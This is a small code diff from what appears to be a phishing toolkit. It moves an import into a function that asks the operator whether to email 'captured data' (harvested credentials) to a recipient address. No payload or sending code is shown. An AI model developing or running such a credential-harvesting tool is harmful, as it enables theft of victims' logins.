@@ -8,7 +8,6 @@
 
 from Defs.ImportManager.unsorted_will_be_replaced import run_command, wait, path, system, getpass, base64, copyfile
 import Defs.ThemeManager.theme as theme
-import Defs.ActionManager.simple_informant as simple_informant
 
 default_palette = theme.default_palette
 
@@ -37,6 +36,7 @@ def captured_data_email_prompt():
         captured_data_email_prompt()
 
 def captured_data_email_confirmation(port):  # Ask user to start sending credentials to recipient Email Address.
+    import Defs.ActionManager.simple_informant as simple_informant
     choice = input(
         "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
     if choice == 'Y' or choice == 'y':
